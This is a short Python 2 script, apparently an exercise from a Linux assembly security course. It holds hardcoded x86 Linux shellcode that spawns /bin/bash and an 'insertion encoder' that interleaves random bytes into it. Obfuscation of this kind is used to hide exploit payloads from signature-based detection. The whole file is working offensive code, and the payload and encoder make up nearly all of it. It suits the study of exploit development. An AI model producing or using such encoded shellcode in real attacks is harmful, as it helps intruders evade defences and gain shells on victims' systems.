#!/usr/bin/python

# Python Insertion Encoder 
# Author Javier Tejedor
# Script based in Vivek Ramachandran's script
# http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
import random

# simple shellcode that launch a shell
shellcode = ("\x31\xc0\x31\xc9\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80");

encoded = ""
plainText = ""
control = 1

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :

	encoded += '0x'
	encoded += '%02x,' %x
	if control == 1:
		encoded += '0x%02x,' % random.randint(1,255)

	control = control + 1
	if control == 3:
		control = 1

 

print encoded

print 'Len: %d' % len(bytearray(shellcode))
